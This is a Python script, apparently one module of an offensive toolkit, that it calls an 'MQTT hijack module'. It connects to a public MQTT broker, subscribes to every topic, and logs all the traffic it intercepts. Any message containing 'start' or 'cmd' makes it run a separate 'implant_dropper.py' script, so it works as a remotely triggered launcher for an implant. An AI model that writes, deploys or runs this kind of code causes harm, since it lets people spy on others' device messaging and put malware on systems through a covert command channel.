
import paho.mqtt.client as mqtt
import time
import json
import threading
import socket
import os

BROKER = "broker.hivemq.com"
PORT = 1883
TOPIC = "#"
AGENT_ID = "mqtt_agent"
LOG_FILE = "reports/mqttex_hijack.log"
ALERT_FILE = "webgui/alerts.json"
CHAIN_SCRIPT = "implant_dropper.py"

def log(msg):
    print(f"[MQTTX] {msg}")
    with open(LOG_FILE, "a") as f:
        f.write(msg + "\n")

def on_connect(client, userdata, flags, rc):
    log(f"Connected to broker with result code {rc}")
    client.subscribe(TOPIC)

def on_message(client, userdata, msg):
    log(f"Message received on {msg.topic}: {msg.payload.decode()}")
    if b"start" in msg.payload or b"cmd" in msg.payload:
        log("Trigger condition met. Chaining implant_dropper...")
        os.system(f"python3 {CHAIN_SCRIPT}")

def push_alert():
    try:
        with open(ALERT_FILE, "a") as f:
            f.write(json.dumps({
                "agent": AGENT_ID,
                "alert": "MQTT hijack in progress",
                "type": "exploit",
                "timestamp": time.time()
            }) + "\n")
    except Exception as e:
        log(f"Alert push failed: {e}")

def main():
    os.makedirs("reports", exist_ok=True)
    log("Starting MQTT hijack module")
    push_alert()
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(BROKER, PORT, 60)
        client.loop_forever()
    except socket.error as e:
        log(f"Socket error: {e}")

if __name__ == "__main__":
    main()
